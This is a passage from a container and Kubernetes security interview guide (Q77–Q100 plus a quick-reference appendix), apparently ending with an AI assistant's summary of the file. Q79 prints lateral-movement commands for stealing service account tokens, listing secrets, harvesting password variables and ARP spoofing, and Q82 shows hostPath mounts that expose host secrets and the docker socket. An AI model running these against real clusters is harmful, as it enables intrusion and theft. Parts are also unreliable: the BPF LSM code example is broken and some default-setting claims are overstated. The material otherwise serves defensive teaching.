3. **JWT tokens in auth headers:** `Authorization: Bearer eyJhbGciOi...` — logged by application or proxy.

4. **API keys in query strings:** `GET /api/data?api_key=sk_live_abc123` — logged in access logs.

5. **Request bodies:** JSON request bodies containing payment card numbers, health data.

**Mitigations:**

```go
// Go: structured logging with field redaction
import "go.uber.org/zap"

// Custom field encoder that redacts sensitive keys
type RedactedEncoder struct{ zap.ObjectEncoder }
func (r RedactedEncoder) AddString(key, val string) {
  sensitiveKeys := map[string]bool{"password": true, "token": true, "secret": true}
  if sensitiveKeys[strings.ToLower(key)] {
    r.ObjectEncoder.AddString(key, "[REDACTED]")
    return
  }
  r.ObjectEncoder.AddString(key, val)
}
```

```nginx
# nginx: Remove sensitive headers from access logs
log_format secure_combined '$remote_addr - $remote_user [$time_local] '
  '"$request_filtered" $status $body_bytes_sent';
# Use map to filter sensitive paths
map $uri $request_filtered {
  ~^/api/auth  "FILTERED /api/auth";
  default $request;
}
```

```yaml
# Fluentd/Vector: scrub sensitive fields in transit
# Vector config
[transforms.scrub_secrets]
type = "remap"
inputs = ["container_logs"]
source = '''
  .message = replace(.message, r'password=[^\s&]+', "password=[REDACTED]")
  .message = replace(.message, r'Authorization: Bearer [^\s]+', "Authorization: Bearer [REDACTED]")
  .message = replace(.message, r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b', "[CARD-REDACTED]")
'''
```

---

### Q78. What is Falco's performance impact, and how do you tune it for production?

**Tags:** `Falco` `performance` `eBPF` `tuning` `overhead`

**Answer:**

**Falco overhead sources:**
1. **System call interception:** Every syscall goes through eBPF probe → userspace evaluation
2. **String matching:** Rule conditions with regex are expensive
3. **Container metadata lookup:** Mapping PID to container ID for every event
4. **Alert emission:** Network/disk I/O for each alert

**Benchmark overhead (typical):**
- eBPF driver: 2-5% CPU overhead on busy hosts
- Kernel module: Similar, but less safe (can crash kernel)
- Modern eBPF (kernel 5.8+, CO-RE): Lower overhead, more portable

**Tuning strategies:**

```yaml
# 1. Reduce syscall scope — only watch syscalls you care about
# falco.yaml
syscall_event_drops:
  actions:
  - log
  - alert
  rate: 0.03333
  max_burst: 10

# 2. Use base_syscalls to limit interception
# Only intercept high-value syscalls
base_syscalls:
  custom_set: [execve, connect, open, mount, unshare, setns, ptrace]
  repair: true

# 3. Prioritize rules by cost
# Expensive: regex, list membership checks on large lists
# Cheap: equality comparisons, integer checks
```

```yaml
# 4. Reduce noise with exceptions
- rule: Shell in Container
  exceptions:
  - name: allowed_shells
    fields: [container.image.repository, proc.name]
    comps: [=, =]
    values:
    - [debug-tools, sh]  # Allow sh in debug-tools image only
```

```bash
# 5. Monitor Falco's own performance
falco --stats-interval 5000  # Print stats every 5s

# Metrics available via Prometheus
curl http://falco:8765/metrics | grep falco_events
# falco_events_processed_total
# falco_drop_count_total
# falco_rules_matched_total
```

---

### Q79. Explain container-to-container attack lateral movement techniques.

**Tags:** `lateral-movement` `network` `service-discovery` `attack`

**Answer:**

**Container-to-container lateral movement techniques:**

**1. Service discovery abuse:**
```bash
# From compromised container, enumerate Kubernetes services
# Internal DNS (CoreDNS) resolves service names
curl http://backend.production.svc.cluster.local:8080/admin
curl http://vault.vault.svc.cluster.local:8200/v1/sys/health
# No authentication needed if NetworkPolicy not configured
```

**2. Pod metadata exfiltration:**
```bash
# Read mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use token to query Kubernetes API
kubectl --token=$TOKEN get pods --all-namespaces
kubectl --token=$TOKEN get secrets
```

**3. Environment variable harvesting:**
```bash
# Kubernetes injects service env vars into ALL pods in same namespace
env | grep -E '_SERVICE_HOST|_SERVICE_PORT|_PASSWORD|_SECRET'
# Example: DATABASE_SERVICE_HOST=10.96.0.50, REDIS_PASSWORD=secret123
```

**4. Side-channel via shared resources:**
```bash
# Containers in same pod share network namespace
# If sidecar is compromised, main app traffic is visible
tcpdump -i lo -w /tmp/capture.pcap  # Captures localhost traffic

# Shared /tmp or shared volumes
ls /shared-volume/  # Access other containers' data
```

**5. ARP spoofing (without NetworkPolicy):**
```bash
# On default bridge network (ICC enabled)
# Container can ARP spoof to intercept traffic between other containers
arpspoof -i eth0 -t <target-container-ip> <gateway-ip>
```

**Mitigations:**
- NetworkPolicy: default deny, explicit allow
- mTLS: even if network is compromised, data is encrypted
- Non-automounted service account tokens: `automountServiceAccountToken: false`
- Remove service env var injection: `enableServiceLinks: false`
- Falco: detect unexpected network connections, kubectl usage from containers

---

### Q80. What is the security model of Docker Desktop vs. production Docker on Linux?

**Tags:** `Docker-Desktop` `VM` `developer-security` `macOS` `Windows`

**Answer:**

**Docker Desktop** runs containers inside a lightweight VM (LinuxKit on macOS/Windows). This fundamentally changes the security model.

**Docker Desktop security model:**

```
macOS/Windows Host
  └── HyperKit/WSL2 (Hypervisor)
        └── LinuxKit VM
              ├── Docker daemon
              ├── containerd
              └── Containers (Linux kernel in VM)
```

**Security differences vs. Linux Docker:**

| Aspect | Linux Docker | Docker Desktop |
|--------|-------------|----------------|
| Container isolation | Shares host Linux kernel | Isolated in LinuxKit VM |
| Host escape blast radius | Host root access | VM root access (limited host impact) |
| Kernel version | Host kernel | LinuxKit kernel (usually latest) |
| `/var/run/docker.sock` | Host socket | Forwarded from VM to host |
| File sharing | Direct bind mount | Virtualized (gVisor-like pass-through) |
| Network | Host networking possible | VM NAT (host networking has caveats) |

**Docker Desktop specific risks:**

1. **Docker socket on host:** `/var/run/docker.sock` (or `.docker/run/docker.sock`) is on the host. Applications with access to this socket can control the Linux VM.

2. **Volume mounts cross VM boundary:** `/Users` is shared into the VM via VirtioFS/gRPC FUSE. Performance and security implications.

3. **Extensions:** Docker Desktop Extensions run with elevated host privileges. Malicious extension = host compromise.

4. **Credential exposure:** Docker credentials stored in macOS Keychain (better) vs. `~/.docker/config.json` (worse).

**Recommendation for developer security:**
- Enable "Use Docker VMware Fusion" or Rosetta for better isolation
- Don't use Docker Desktop Extensions from untrusted sources
- Use rootless mode where possible
- Regular Docker Desktop updates (patches LinuxKit kernel)

---

### Q81. How do you handle container security in a multi-tenant Kubernetes cluster?

**Tags:** `multi-tenancy` `namespace` `isolation` `noisy-neighbor` `HNC`

**Answer:**

**Multi-tenancy threat model:**
- Tenant A should not be able to read Tenant B's data
- Tenant A should not be able to DoS Tenant B (resource exhaustion)
- Tenant A should not be able to escape to host and compromise all tenants
- Tenant A should not be able to escalate to cluster-admin

**Isolation layers:**

```yaml
# 1. Namespace per tenant
# 2. ResourceQuota per namespace
apiVersion: v1
kind: ResourceQuota
metadata:
  name: tenant-a-quota
  namespace: tenant-a
spec:
  hard:
    requests.cpu: "10"
    requests.memory: 20Gi
    limits.cpu: "20"
    limits.memory: 40Gi
    pods: "100"
    services.loadbalancers: "3"
    persistentvolumeclaims: "20"

# 3. LimitRange per namespace (prevents pods without limits)
apiVersion: v1
kind: LimitRange
metadata:
  name: tenant-limits
  namespace: tenant-a
spec:
  limits:
  - type: Container
    default: { cpu: "500m", memory: "512Mi" }
    defaultRequest: { cpu: "100m", memory: "128Mi" }
    max: { cpu: "4", memory: "8Gi" }

# 4. NetworkPolicy: default deny between namespaces
# 5. RBAC: tenant SA can only access own namespace
# 6. PSA restricted for all tenant namespaces
# 7. Separate node pools per tenant (for hard multi-tenancy)
```

**Hard multi-tenancy (node-level isolation):**
```yaml
# Dedicated node pool per tenant
nodeSelector:
  tenant: "tenant-a"
tolerations:
- key: "tenant"
  operator: "Equal"
  value: "tenant-a"
  effect: "NoSchedule"
```

**Hierarchical Namespace Controller (HNC):**
```bash
# Policy inherited from parent namespace
kubectl hns create tenant-a-dev --parent tenant-a
# ResourceQuota, LimitRange, NetworkPolicy automatically inherited
```

---

### Q82. What are the security implications of using `hostPath` volumes?

**Tags:** `hostPath` `volume` `escape` `kubernetes`

**Answer:**

`hostPath` volumes mount a directory from the host node's filesystem into the container. They are extremely dangerous.

**Attack scenarios:**

```yaml
# Scenario 1: Read host secrets
volumes:
- name: host-etc
  hostPath:
    path: /etc  # Mounts /etc from host
# Container can read /etc/shadow, /etc/kubernetes/pki/*, etc.

# Scenario 2: Write persistence (backdoor)
volumes:
- name: host-cron
  hostPath:
    path: /etc/cron.d
# Container writes cron job that runs on host

# Scenario 3: Docker socket (container escape)
volumes:
- name: docker-sock
  hostPath:
    path: /var/run/docker.sock

# Scenario 4: containerd socket (K8s context)
volumes:
- name: containerd-sock
  hostPath:
    path: /run/containerd/containerd.sock

# Scenario 5: kubelet config access
volumes:
- name: kubelet-config
  hostPath:
    path: /var/lib/kubelet
```

**Mitigation:**

```yaml
# PSA restricted profile blocks hostPath
# OPA/Gatekeeper constraint
- rule: Deny HostPath Volumes
  condition: >
    input.review.object.spec.volumes[_].hostPath
  msg: "hostPath volumes are not permitted"

# If hostPath is absolutely needed: use readOnly and specific path
volumes:
- name: log-path
  hostPath:
    path: /var/log/myapp
    type: DirectoryOrCreate
volumeMounts:
- name: log-path
  mountPath: /var/log/myapp
  readOnly: true  # Read-only from container perspective
```

---

### Q83. How do you implement security for Docker Compose in development vs. production?

**Tags:** `docker-compose` `development` `security` `production`

**Answer:**

**Docker Compose is NOT designed for production** (no health check restarting, no secrets management, no RBAC). However, security matters in all environments.

**Development Compose security:**
```yaml
# docker-compose.yml
version: '3.8'
services:
  app:
    build: .
    user: "1001:1001"               # Non-root
    read_only: true                  # Read-only filesystem
    tmpfs:
      - /tmp                         # Writable tmp
    security_opt:
      - no-new-privileges:true
      - apparmor:docker-default
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    environment:
      - NODE_ENV=development
    # NEVER use environment for secrets in any environment
    secrets:
      - db_password

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    volumes:
      - db_data:/var/lib/postgresql/data  # Named volume (not hostPath)

secrets:
  db_password:
    file: ./secrets/db_password.txt  # .gitignored file

volumes:
  db_data:

networks:
  default:
    driver: bridge
    internal: true  # No external connectivity for internal services
```

**Key security differences dev vs. prod:**

| Control | Development | Production |
|---------|-------------|-----------|
| Secrets | Local file (`.gitignored`) | Vault/AWS Secrets Manager |
| Orchestration | Compose | Kubernetes |
| Scaling | None | HPA/cluster autoscaler |
| Health | Manual | Kubernetes probes |
| Access | Developer VPN | RBAC + audit |
| Image | `:dev` (debug tools) | `:prod` (distroless) |

---

### Q84. What is eBPF LSM (BPF-based Linux Security Module), and how does it advance container security?

**Tags:** `BPF-LSM` `Landlock` `kernel-security` `programmable`

**Answer:**

**BPF LSM** (kernel 5.7+) allows writing LSM hooks in eBPF programs — creating custom security policies without kernel modules.

**Traditional LSMs** (SELinux, AppArmor): Static policy compiled into kernel, complex policy language, global system-wide.

**BPF LSM advantages:**
- Policies written in C (compiled to eBPF), loaded dynamically at runtime
- Per-container granularity (using namespaces and cgroup identifiers)
- Composable: multiple BPF LSM programs can stack
- Hot-reload: update policy without restart

```c
// BPF LSM program example
// Block execve of /bin/sh in specific cgroup
SEC("lsm/bprm_check_security")
int BPF_PROG(check_exec, struct linux_binprm *bprm) {
    // Get current cgroup
    struct cgroup *cg = bpf_get_current_cgroup_id();
    
    // Check if this is our restricted container's cgroup
    if (cg != RESTRICTED_CGROUP_ID)
        return 0;  // Allow for other cgroups
    
    // Check if executing /bin/sh
    char path[64];
    bpf_d_path(&bprm->file->f_path, path, sizeof(path));
    if (!bpf_strncmp(path, 7, "/bin/sh"))
        return -EPERM;  // Block execution
    
    return 0;
}
```

**Landlock (kernel 5.13+):**
A separate sandboxing mechanism (not BPF LSM) that allows unprivileged processes to restrict their own file system access:
```c
// Application self-sandboxes its own file access
// No root required!
struct landlock_ruleset_attr ruleset_attr = {
    .handled_access_fs = LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_WRITE_FILE
};
int ruleset_fd = landlock_create_ruleset(&ruleset_attr, sizeof(ruleset_attr), 0);
// Add allowed paths, then restrict
landlock_restrict_self(ruleset_fd, 0);
// Now the process can only access explicitly allowed paths
```

---

### Q85. How do you manage container security in an air-gapped environment?

**Tags:** `air-gapped` `offline` `registry-mirror` `vulnerability-management`

**Answer:**

**Air-gapped environment challenges:**
- Cannot pull images from internet registries
- Cannot update vulnerability databases online
- Cannot use cloud-based signing services (Sigstore public Rekor)
- Software updates must be carefully vetted before import

**Architecture:**
```
Internet (limited)          |        Air-gapped network
                            |
Jump host with scanning     |  Internal Harbor registry
        ↓                   |        ↑
   Scan + sign images ──────────────→ (approved, signed images only)
   Import vuln DB          |  Internal Rekor/Fulcio (self-hosted)
                            |  Internal Trivy DB mirror
                            |  Internal kube-apiserver
```

**Implementation:**

```bash
# 1. Set up Harbor as internal registry (mirror)
# Harbor with built-in Trivy scanner (offline DB update)
# Trivy offline database
trivy --offline-scan image myimage  # Uses local DB
# Update DB periodically via jump host
trivy image --download-db-only  # On internet-connected host
# Transfer DB to air-gapped host via secure transfer

# 2. Self-hosted Sigstore stack
# Deploy Rekor, Fulcio, CT log on internal infrastructure
cosign sign \
  --rekor-url https://rekor.internal.example.com \
  --fulcio-url https://fulcio.internal.example.com \
  myimage:latest

# 3. Image import process
# External → Jump host
docker pull ubuntu:22.04
docker save ubuntu:22.04 | gzip > ubuntu-22.04.tar.gz
# Verify: scan, check provenance
trivy image --input ubuntu-22.04.tar.gz
# Sign with internal key
cosign sign --key internal-cosign.key ubuntu-22.04.tar.gz
# Transfer to air-gapped via secure channel (approved USB, one-way diode)
# Import: docker load < ubuntu-22.04.tar.gz
# Push to internal Harbor: docker push internal-harbor.example.com/ubuntu:22.04

# 4. Admission policy: only allow images from internal registry
# Kyverno rule: image must match internal-harbor.example.com/*
```

---

### Q86. What are the key metrics and SLIs for container security posture monitoring?

**Tags:** `metrics` `SLI` `posture` `dashboards` `MTTD` `MTTR`

**Answer:**

**Security posture metrics:**

**Vulnerability metrics:**
```
Critical CVEs (unfixed) across fleet
CVE remediation SLA compliance rate: 
  - P0 (CVSS 9+): 48h SLA
  - P1 (CVSS 7-8.9): 7-day SLA
  - P2 (CVSS 4-6.9): 30-day SLA
Mean Time to Patch (MTTP)
Images with outdated base layers (>30 days since base update)
% images from approved base images
```

**Runtime security metrics:**
```
Falco alert rate (by severity, by namespace)
Mean Time to Detect (MTTD) — alert to human awareness
Mean Time to Respond (MTTR) — detection to containment
False positive rate (tunes Falco quality)
Container escape attempts (per day/week)
Policy violations (PSA, OPA denials)
```

**Configuration metrics:**
```
% pods with resource limits set
% pods running as non-root
% pods with read-only root filesystem
% pods with seccomp profile applied
% pods with AppArmor profile applied
% images signed and verified
% secrets using external secrets operator vs native k8s secrets
```

**Supply chain metrics:**
```
% images with valid SBOM
% images with SLSA provenance
% images from approved registries
Build tool versions in use (track for vulnerable build tools)
```

**Dashboard implementation:**
```yaml
# Prometheus metrics from:
# - Falco Prometheus exporter (falcosidekick)
# - kube-state-metrics (pod security context)
# - Trivy Operator (CVE metrics from k8s resources)
# - Gatekeeper audit (policy violations)

# Trivy Operator example metrics
kube_vulnerability_id{severity="CRITICAL", resource="Pod", namespace="prod"}

# Grafana dashboard panels:
# 1. Critical CVE trend line
# 2. Falco alert heatmap (time × namespace)
# 3. Policy compliance gauge (% pods compliant per control)
# 4. Image freshness (age distribution histogram)
```

---

### Q87. Describe a complete secure container deployment architecture from code to production.

**Tags:** `architecture` `end-to-end` `DevSecOps` `shift-left`

**Answer:**

**Complete Secure Container Deployment Architecture:**

```
[Developer] → [Git Repository] → [CI/CD Pipeline] → [Registry] → [Kubernetes]
```

**Stage 1: Code (Shift-Left)**
```bash
# Pre-commit hooks
- trufflehog (secret scanning)
- hadolint (Dockerfile linting)
- checkov (IaC scanning)
- go vet / cargo clippy (code analysis)

# IDE plugins
- Snyk IDE plugin (real-time vulnerability scanning)
```

**Stage 2: Build (CI/CD)**
```yaml
# Pipeline stages:
1. Checkout (pinned action SHA)
2. SAST scan (Semgrep, CodeQL)
3. Dependency audit (npm audit, cargo audit)
4. Docker build (BuildKit, --no-cache)
   - Multi-stage build
   - BuildKit secret mounts (no secrets in layers)
   - Non-root user
5. Image scan (Trivy, Grype)
   - Fail on unfixed HIGH/CRITICAL
6. SBOM generation (Syft)
7. Image signing (Cosign keyless via OIDC)
8. SLSA provenance generation
9. Push to staging registry
```

**Stage 3: Registry (Control Gate)**
```bash
Harbor configuration:
- Scan on push (Trivy)
- Content trust required
- RBAC: CI can push to staging/*, human approval for production/*
- Replication to production registry requires manual approval gate
```

**Stage 4: Kubernetes Deployment**
```yaml
Admission control stack:
1. PSA (restricted profile) — namespace label
2. Gatekeeper/Kyverno:
   - Require image signature
   - Require image from approved registry
   - Require resource limits
   - Block privileged
   - Require non-root
   - Require seccomp: RuntimeDefault
3. Vault Agent/CSI Secret Store (no k8s secrets for sensitive data)

Deployment:
- GitOps (FluxCD/ArgoCD) — all changes via Git, audit trail
- Rolling updates with health checks
- canary deployment with automated rollback on error rate spike
```

**Stage 5: Runtime**
```yaml
Monitoring stack:
- Falco (syscall-based threat detection)
- Tetragon (policy enforcement)
- Cilium (network policy, mTLS)
- Prometheus + Grafana (security metrics)
- Falcosidekick → PagerDuty (CRITICAL alerts)
- ELK/Splunk (log aggregation + SIEM)
```

---

### Q88–Q100: Rapid-Fire Expert Questions

---

### Q88. What is the `seccompDefault` feature gate in Kubernetes, and why is it a security milestone?

**Answer:** Enabled by default in Kubernetes 1.27, `seccompDefault` applies the `RuntimeDefault` seccomp profile to all pods that don't explicitly specify a seccomp profile. Before this, pods ran with no seccomp profile by default (full syscall access). This is a significant security improvement as it reduces kernel attack surface for all workloads without requiring developers to explicitly configure seccomp.

---

### Q89. Explain the OCI image manifest v2 schema 2 digest pinning security model.

**Answer:** OCI image manifest v2 uses SHA256 content addressing. When you reference `image@sha256:abc123`, Docker/containerd verifies every layer and the manifest against that digest. This is cryptographically binding — not trust on a name, but trust on content. The digest is computed over the manifest JSON, which contains layer digests, which are computed over layer tar contents. Any modification to any byte of any layer produces a different digest at every level. Tags (`image:v1.0`) are mutable pointers to digests — always pin to digest in production.

---

### Q90. What is container image "fat manifest" (multi-architecture manifest list), and what are its security implications?

**Answer:** A "fat manifest" or manifest list (`application/vnd.docker.distribution.manifest.list.v2+json`) is an OCI index that maps platform/architecture to specific image manifests. Security implication: when you pull `myimage:latest` on an ARM node, you get a different image blob than on an AMD64 node. Both should be scanned separately, as vulnerabilities may differ by architecture. Signing a manifest list signs the index — verify your signing/scanning covers all platform manifests.

---

### Q91. How does `docker save` vs. `docker export` differ in terms of security and forensics?

**Answer:** `docker save` exports the full image with all layers and metadata as an OCI archive — useful for image analysis and forensics of the image build history. `docker export` exports only the current container filesystem as a flat tar — no layer history, no metadata. From a forensics perspective: `docker save` preserves evidence of how the image was built (potentially revealing secrets in intermediate layers). `docker export` creates a snapshot of the current runtime state (useful for capturing container state post-compromise). Neither includes runtime memory.

---

### Q92. What is the security risk of `COPY --from=<stage>` vs. `COPY --from=<image>` in multi-stage builds?

**Answer:** `COPY --from=<image>` copies from a registry image, not a local build stage. Security risk: this image is pulled from the registry at build time, and its content depends on the registry's current state of that tag. If the tag is mutable and the image is compromised, your build is compromised. Mitigation: use `COPY --from=<image>@sha256:digest` to pin to a specific digest, or use local build stages where possible.

---

### Q93. How do you detect and prevent "time-of-check to time-of-use" (TOCTOU) vulnerabilities in container builds?

**Answer:** TOCTOU in container builds: a `RUN` step checks a file, then another instruction uses it — between check and use, the file could change (e.g., via build cache injection). In `runc`: TOCTOU in namespace setup was the root cause of CVE-2019-5736. Mitigations: use BuildKit's `--mount=type=cache` with proper invalidation, use content-addressed references (`@sha256:digest`) for all external references, avoid scripts that download at runtime during build (use `COPY` of pre-downloaded, verified files). For runtime: seccomp and AppArmor prevent the exploit class even if TOCTOU exists.

---

### Q94. What is the Kubernetes API server's `--anonymous-auth` flag, and what happens if it's enabled?

**Answer:** `--anonymous-auth=true` (enabled by default) allows unauthenticated requests to the API server. They are assigned the `system:anonymous` user and `system:unauthenticated` group. Combined with misconfigured RBAC (e.g., `ClusterRoleBinding` to `system:unauthenticated`), this allows unauthenticated cluster access. The `/healthz`, `/livez`, `/readyz` endpoints require anonymous access for load balancers — don't disable anonymous auth entirely. Instead, ensure RBAC grants no significant permissions to `system:unauthenticated`. Audit: `kubectl auth can-i list pods --as=system:anonymous`.

---

### Q95. What is the difference between `CAP_NET_RAW` and `CAP_NET_ADMIN`, and why should both be dropped?

**Answer:** `CAP_NET_RAW` allows: creating raw sockets (packet crafting, ARP spoofing, ICMP), binding to any local address. Risk: network reconnaissance, ARP poisoning against other containers, ICMP-based covert channels. Docker includes this by default — drop it. `CAP_NET_ADMIN` allows: network interface configuration, routing table modification, iptables manipulation, creating tunnel devices. Much more dangerous — can reconfigure the container's network namespace entirely, potentially create bridges to host network, modify packet routing. Never grant `CAP_NET_ADMIN` unless absolutely necessary (e.g., CNI plugins, network tools).

---

### Q96. How does `docker buildx` with `--platform` cross-compilation work, and what are the security concerns?

**Answer:** Cross-compilation in BuildKit uses QEMU user-mode emulation (or native cross-compilers). When building `linux/arm64` on an `amd64` host, `binfmt_misc` + QEMU ARM64 emulator runs ARM64 binaries. Security concerns: (1) QEMU itself is a large attack surface — bugs in QEMU emulation could be exploited by malicious Dockerfiles; (2) `binfmt_misc` kernel module must be loaded on the host — expands kernel attack surface; (3) Cross-compiled binaries should be scanned on their target architecture (vulnerabilities may be architecture-specific); (4) Use `--platform linux/amd64,linux/arm64` with Buildx's native builders (separate build nodes) to avoid QEMU entirely.

---

### Q97. What is the Kubernetes `ServiceAccount` token volume projection, and how does it improve security over the default?

**Answer:** Traditional service account tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`) are: non-expiring JWTs, scoped to the entire service account, automatically mounted in all pods. Projected service account tokens (Kubernetes 1.20+, default in 1.22+): have configurable TTL (default 1 hour), are audience-bound (token only valid for specific service), are automatically rotated by kubelet before expiry. Security benefits: short-lived tokens limit the window of compromise; audience binding prevents token reuse for unintended services. Disable auto-mount for pods that don't need API access: `automountServiceAccountToken: false`.

---

### Q98. Explain the security architecture of `containerd`'s content store and how it prevents tampering.

**Answer:** containerd's content store is a content-addressable blob store at `/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256/`. Each blob is named by its SHA256 hash. When containerd fetches an image layer, it: (1) streams the blob, (2) computes SHA256 on-the-fly, (3) writes to a temporary file, (4) verifies the computed hash matches the expected hash from the manifest, (5) atomically renames to the final path (`sha256/<hash>`). Any tampered blob has a different hash and is rejected at verification step. The content store is read-only after write (files are written once, then read-only). This provides integrity guarantees: you cannot silently substitute a different blob for the same digest.

---

### Q99. What is `runc`'s `spec` command, and how is it used in security research?

**Answer:** `runc spec` generates a default OCI runtime specification (`config.json`) for a container. Security researchers use it to: (1) understand the exact capabilities, namespaces, and mounts that runc would create; (2) create minimal custom containers for security testing (reduce to absolute minimum: no capabilities, no mounts, no devices); (3) test runtime behavior by manually constructing and running containers (`runc run -b /bundle mycontainer`); (4) reproduce security bugs by crafting specific `config.json` that triggers edge cases. The spec command outputs the baseline security configuration — useful as a starting point for comparing what Docker/containerd add vs. the OCI minimum.

---

### Q100. What would a "perfect" container security stack look like in 2025, and what are the remaining unsolved problems?

**Answer:**

**Current "best in class" stack:**

| Layer | Technology |
|-------|-----------|
| Base image | `gcr.io/distroless` or `scratch` |
| Build | BuildKit + Kaniko + SLSA L3 |
| Signing | Cosign keyless (OIDC) |
| Runtime | `crun` or `gVisor` (untrusted) |
| LSM | AppArmor + SELinux + BPF LSM |
| Syscall filter | Seccomp RuntimeDefault |
| Network | Cilium (eBPF, mTLS, L7 policy) |
| Identity | SPIFFE/SPIRE workload identity |
| Secrets | CSI Secret Store (Vault/AWS SM) |
| Detection | Falco + Tetragon |
| Admission | Gatekeeper + Kyverno + PSA |
| Scanning | Trivy + Grype (SBOM-based) |
| Isolation | Kata Containers (high-security multi-tenant) |

**Remaining unsolved problems:**

1. **Kernel exploit mitigation** — No userspace solution fully prevents kernel exploits. gVisor/Kata add VM boundary, but add complexity/overhead. Formal verification of kernel security-critical paths remains aspirational.

2. **Supply chain complexity** — The dependency graph is too deep. `npm install` pulls hundreds of transitive dependencies. Full verification of the entire supply chain is computationally impractical today.

3. **Performance vs. security** — gVisor/Kata provide strong isolation but significant overhead. Seccomp filtering adds ~1-3% syscall overhead. There is no zero-cost security.

4. **Secret sprawl** — Even with best-in-class tooling, secrets leak into logs, environment, crash dumps. Perfect secret hygiene at scale remains elusive.

5. **Lateral movement in service mesh** — Even with mTLS, a compromised service with valid credentials can attack peer services. L7 AuthorizationPolicy helps but requires precise modeling.

6. **Developer experience friction** — The most secure configuration is often the hardest to use. Adoption lags because security slows development. Closing this gap is as much a cultural/tooling challenge as a technical one.

7. **Zero-day response time** — Time from kernel CVE publication to patch deployment across a fleet is still measured in days-to-weeks. Runtime protection (seccomp, gVisor) partially mitigates but doesn't eliminate exposure.

---

## Appendix: Quick Reference

### Essential Security Commands

```bash
# Container inspection
docker inspect <id> | jq '.[].HostConfig | {Privileged, CapAdd, CapDrop, SecurityOpt}'
docker inspect <id> | jq '.[].Config.Env'

# Capabilities
capsh --decode=$(cat /proc/1/status | grep CapEff | awk '{print $2}')

# Namespace inspection
ls -la /proc/1/ns/
lsns -p <pid>

# Seccomp profile
cat /proc/1/status | grep Seccomp
# 0=disabled, 1=strict, 2=filter (BPF)

# AppArmor
cat /proc/1/attr/current

# cgroup
cat /proc/1/cgroup

# Scan with Trivy
trivy image --severity HIGH,CRITICAL myimage

# Generate SBOM
syft myimage -o spdx-json

# Sign
cosign sign --yes myimage@sha256:...

# Verify
cosign verify --certificate-identity-regexp="..." --certificate-oidc-issuer="..." myimage
```

### Security Decision Tree for New Container Deployments

```
Is the workload untrusted (user code)? 
  YES → Kata or gVisor runtime
  NO  → runc/crun with full hardening:
         ├── Non-root user (runAsNonRoot: true)
         ├── Read-only root filesystem
         ├── Drop ALL capabilities
         ├── No privilege escalation
         ├── Seccomp: RuntimeDefault
         ├── AppArmor: docker-default or custom
         ├── Resource limits
         └── NetworkPolicy: default deny
```

---

*Document version: 1.0 | Scope: Docker CE, containerd 1.7+, Kubernetes 1.28+ | Last reviewed: 2025*

Let me build this comprehensive file now.100 questions across 9 sections, fully detailed. Here's the structural breakdown:

| Section | Questions | Core Domain |
|---|---|---|
| Linux Kernel Primitives | Q1–15 | namespaces, cgroups, seccomp, capabilities, LSM, eBPF |
| Docker Engine & Daemon | Q16–30 | socket hardening, DCT, BuildKit, CIS benchmark, daemon.json |
| containerd & OCI Runtime | Q31–40 | shim, snapshotter, runc/gVisor/Kata, OCI spec, CRI |
| Image & Supply Chain | Q41–50 | SBOM, SLSA, Sigstore/Cosign, base image poisoning, distroless |
| Network Security | Q51–55 | bridge/host/overlay modes, iptables DOCKER-USER, NetworkPolicy, DNS |
| Secrets & Credentials | Q56–58 | env vars vs CSI driver, etcd encryption, KMS, sealed secrets |
| Runtime Threat Detection | Q59–61 | Falco rules, Tetragon enforcement, IR playbook |
| Kubernetes Integration | Q62–66 | PSA, OPA/Gatekeeper, RBAC, admission pipeline, IMDS SSRF |
| Compliance & Hardening | Q67–100 | audit logging, zero-trust, multi-tenancy, BPF LSM, air-gap |

**Depth highlights:**
- CVE-2019-5736 (`runc` escape) with the exact `memfd_create` fix explained
- `--privileged` exhaustive breakdown of every boundary removed
- Dirty COW showing why namespaces are irrelevant for kernel bugs
- SLSA L1→L4 with concrete GitHub Actions implementation
- Q100 covers unsolved problems — the kind of answer that separates staff from senior